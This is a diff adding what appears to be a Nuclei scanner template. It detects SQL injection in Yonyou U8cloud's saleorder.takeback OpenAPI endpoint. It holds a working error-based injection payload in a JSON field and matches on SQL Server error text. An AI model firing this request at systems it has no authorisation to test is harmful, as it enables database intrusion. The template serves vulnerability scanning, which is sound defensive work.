@@ -1,0 +1,34 @@
+id: youyouU8-takeback-sql
+
+info:
+  name: 用友U8cloud /u8cloud/openapi/so.saleorder.takeback 存在SQL注入漏洞
+  author: youyouU8
+  severity: high
+  tags: youyouU8
+
+http:
+  - raw:
+      - |
+        POST /u8cloud/openapi/so.saleorder.takeback?appcode=huo&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Connection: close
+        Accept-Encoding: gzip
+
+        {
+            "pk_proposer": "1",
+            "operator": "1",
+            "pk_corp": "1",
+            "keys": ["1'and 1=@@VERSION--"]
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
+          - 'Microsoft SQL Server'
+          - '转换成数据类型'
+        condition: and
